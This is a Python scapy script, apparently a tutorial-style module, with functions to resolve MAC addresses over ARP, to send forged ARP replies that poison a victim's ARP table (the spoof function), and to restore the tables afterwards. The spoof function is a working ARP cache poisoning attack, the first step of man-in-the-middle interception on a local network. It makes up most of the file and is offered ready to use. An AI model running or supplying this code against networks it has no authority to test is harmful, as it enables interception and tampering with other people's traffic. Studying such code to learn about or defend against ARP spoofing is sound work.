import scapy.all as scapy

def get_mac(ip):
    """
    Returns the MAC address of the given ip
    Step 1: Creating an ARP packet object to the given ip
    Step 2: Creating an Ether packet object
    Note: dst is the broadcast mac address (ff:ff:ff:ff:ff:ff)
    Step 3: Combining two packet objects into 1
    Step 4: Listing the responders
    Note: Index 0 is the results (List of responders) and 1 is the list of unanswered
    Step 5: Check if we have any responders and return the MAC address
    Note: Each responder is a QueryAnswer with key 1 as the MAC address
    """
    
    # Step 1
    arp_request = scapy.ARP(pdst=ip)

    # Step 2
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Step 3
    arp_request_broadcast = broadcast/arp_request

    # Step 4
    responders = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
    # Step 5
    try:
        return responders[0][1].hwsrc
    except Exception as e:
        print("\n No MAC address found.")
        return None

def spoof(victim_ip, target):
    """
    Spoofs the ARP table of the victim
    As the result, target MAC address will be changed to the attacker's MAC address
    Step 1: Get the MAC address of the victim
    Step 2: Creating an ARP packet from target to victim
    Note: op=2 means that ARP is going to send answer
    Step 3: Send the packet created without output
    """
    
    # Step 1
    victim_mac = get_mac(victim_ip)

    # Step 2
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target)
    
    # Step 3
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    """
    Restores ARP tables to their correct state
    Note: The correction packet will be sent 4 times to ensure host is received
    """

    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    
